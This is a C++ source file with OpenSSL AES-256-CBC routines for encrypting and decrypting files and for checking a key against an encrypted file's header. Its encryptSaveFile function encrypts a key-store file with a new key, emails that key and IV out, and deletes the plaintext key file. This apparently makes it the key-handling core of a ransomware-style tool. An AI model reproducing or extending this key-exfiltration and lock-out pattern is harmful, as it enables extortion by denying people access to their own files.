#include "CryptoAes256.h"
#include "FileUtils.h"
#include "KeyUtils.h"
#include "EmailUtils.h"
#include <openssl/err.h>
#include <openssl/evp.h>
#include <iostream>

void printError(const std::string &msg) {
  std::cerr << msg << " Error: " << ERR_reason_error_string(ERR_get_error()) << std::endl;
}

bool CryptoAes256::encryptFileAES256(const fs::path &inputFile, const fs::path &encryptedFile, const KeyIvAES& keyIv) {
  const auto &KEY = keyIv.key;
  const auto &IV = keyIv.iv;

  // Initialize encryption context
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  if (!ctx) {
    printError("Failed to create EVP_CIPHER_CTX");
    return false;
  }

  // Set AES-256-CBC algorithm with key and IV
  if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, KEY.data(), IV.data())) {
    printError("EVP_EncryptInit_ex failed");
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }

  // Open input and output files
  std::ifstream infile(inputFile, std::ios::binary);
  std::ofstream outfile(encryptedFile, std::ios::binary);
  if (!infile.is_open()) {
    std::cerr << "Failed to open input file: " << inputFile.string() << std::endl;
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }
  if (!outfile.is_open()) {
    std::cerr << "Failed to open output file: " << encryptedFile.string() << std::endl;
    infile.close();
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }

  const size_t buffer_size = 16384; // Increased buffer size to 16384 bytes
  unsigned char buffer[buffer_size];
  unsigned char ciphertext[buffer_size + EVP_MAX_BLOCK_LENGTH]; // Space for padding
  int len;

  // Encrypt the file block by block
  while (infile.read(reinterpret_cast<char *>(buffer), buffer_size) || infile.gcount() > 0) {
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, buffer, infile.gcount())) {
      printError("EVP_EncryptUpdate failed");
      EVP_CIPHER_CTX_free(ctx);
      return false;
    }
    outfile.write(reinterpret_cast<char *>(ciphertext), len);
    if (outfile.fail()) {
      std::cerr << "Failed to write ciphertext to output file." << std::endl;
      EVP_CIPHER_CTX_free(ctx);
      return false;
    }
  }

  // Finalize the encryption and add padding
  if (1 != EVP_EncryptFinal_ex(ctx, ciphertext, &len)) {
    printError("EVP_EncryptFinal_ex failed");
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }
  outfile.write(reinterpret_cast<char *>(ciphertext), len);
  if (outfile.fail()) {
    std::cerr << "Failed to write final ciphertext block to output file." << std::endl;
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }

  // Free the context
  EVP_CIPHER_CTX_free(ctx);
  return true;
}

bool CryptoAes256::decryptFileAES256(const fs::path &encryptedFilePath, const fs::path &decryptedFilePath, const KeyIvAES& keyIv) {
  const auto &KEY = keyIv.key;
  const auto &IV = keyIv.iv;

  // Überprüfen Sie die Schlüssellänge
  if (KEY.size() != 32 || IV.size() != 16) {
    std::cerr << "Invalid key or IV size!" << std::endl;
    return false;
  }

  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  if (!ctx) {
    printError("Failed to create EVP_CIPHER_CTX");
    return false;
  }

  // Initialisieren Sie den Dekryptierungs-Kontext mit AES-256
  if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, KEY.data(), IV.data()) != 1) {
    printError("EVP_DecryptInit_ex failed");
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }

  std::ifstream infile(encryptedFilePath, std::ios::binary);
  std::ofstream outfile(decryptedFilePath, std::ios::binary);
  if (!infile.is_open()) {
    std::cerr << "Failed to open input file: " << encryptedFilePath << std::endl;
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }
  if (!outfile.is_open()) {
    std::cerr << "Failed to open output file: " << decryptedFilePath << std::endl;
    infile.close();
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }

  const size_t buffer_size = 16384; // Puffergröße
  unsigned char buffer[buffer_size];
  unsigned char plaintext[buffer_size + EVP_MAX_BLOCK_LENGTH]; // Puffer für entschlüsselte Daten
  int len = 0;

  // Entschlüsseln Sie die Datei blockweise
  while (infile.read(reinterpret_cast<char *>(buffer), buffer_size) || infile.gcount() > 0) {
    std::cout << "Reading and decrypting block, read size: " << infile.gcount() << std::endl;

    // Entschlüsseln Sie den aktuellen Block
    if (EVP_DecryptUpdate(ctx, plaintext, &len, buffer, infile.gcount()) != 1) {
      printError("EVP_DecryptUpdate failed");
      EVP_CIPHER_CTX_free(ctx);
      return false;
    }

    // Schreiben Sie die entschlüsselten Daten in die Ausgabedatei
    if (outfile.write(reinterpret_cast<char *>(plaintext), len).fail()) {
      std::cerr << "Failed to write plaintext to output file." << std::endl;
      EVP_CIPHER_CTX_free(ctx);
      return false;
    }
  }

  // Finalisieren Sie die Entschlüsselung
  int finalLen = 0;
  if (EVP_DecryptFinal_ex(ctx, plaintext, &finalLen) != 1) {
    printError("EVP_DecryptFinal_ex failed");
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }

  // Schreiben Sie den letzten Block in die Ausgabedatei
  if (outfile.write(reinterpret_cast<char *>(plaintext), finalLen).fail()) {
    std::cerr << "Failed to write final plaintext to output file." << std::endl;
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }

  EVP_CIPHER_CTX_free(ctx);
  return true;
}

bool CryptoAes256::testKeyOnEncryptedFileAES256(const fs::path& encryptedFilePath, const KeyIvAES& keyIv) {
  // Create temporary file path for decrypted file
  fs::path decryptedFilePath = encryptedFilePath.parent_path() / "sstest89Test89ss.txt";

  // Decrypt the file
  if (!decryptFileAES256(encryptedFilePath, decryptedFilePath, keyIv)) {
    std::cerr << "Test decryption failed." << std::endl;
    fs::remove(decryptedFilePath);
    return false; // Decryption failed
  }

  // Check the header of the decrypted file
  std::ifstream decryptedFile(decryptedFilePath);
  if (!decryptedFile.is_open()) {
    std::cerr << "Failed to open decrypted file for verification." << std::endl;
    fs::remove(decryptedFilePath); // Clean up temporary file
    return false; // File cannot be opened
  }

  std::string firstLine;
  std::getline(decryptedFile, firstLine); // Read the first line
  decryptedFile.close();

  // Compare the header
  if (firstLine == FILE_HEADER) {
    // Clean up the temporary decrypted file
    fs::remove(decryptedFilePath);
    return true; // Key appears to be correct
  } else {
    std::cerr << "Decrypted file header does not match expected header." << std::endl;
    // Clean up the temporary decrypted file
    fs::remove(decryptedFilePath);
    return false; // Key is incorrect
  }
}

void CryptoAes256::encryptSaveFile() {
  EmailUtils emailUtils;
  KeyUtils keyUtils;
  KeyIvAES keyIvAes;

  keyIvAes = keyUtils.generateKeyIv(32);

  if (encryptFileAES256(KEY_IV_SAVE_FILE, ENCRYPTED_KEY_IV_SAVE_FILE, keyIvAes)) {
    std::cout << "Save File encryption Succeeded" << std::endl;
    if (SEND_EMAIL) {
      std::string key = keyUtils.bytesToInts(keyIvAes.key);
      std::string iv = keyUtils.bytesToInts(keyIvAes.iv);

      std::string messageBody = "Key: " + key + " | Iv: " + iv;
      emailUtils.sendEmailWithRust(messageBody);
    }

    if (fs::exists(KEY_IV_SAVE_FILE)) {
      fs::remove(KEY_IV_SAVE_FILE);
    }

  } else {
    std::cerr << "Save File encryption failed" << std::endl;
  }
}

void CryptoAes256::decryptSaveFile(const KeyIvAES& keyIv) {
  if (decryptFileAES256(ENCRYPTED_KEY_IV_SAVE_FILE, KEY_IV_SAVE_FILE, keyIv)) {
    if (fs::exists(ENCRYPTED_KEY_IV_SAVE_FILE)) {
      fs::remove(ENCRYPTED_KEY_IV_SAVE_FILE);
    }
  }
}
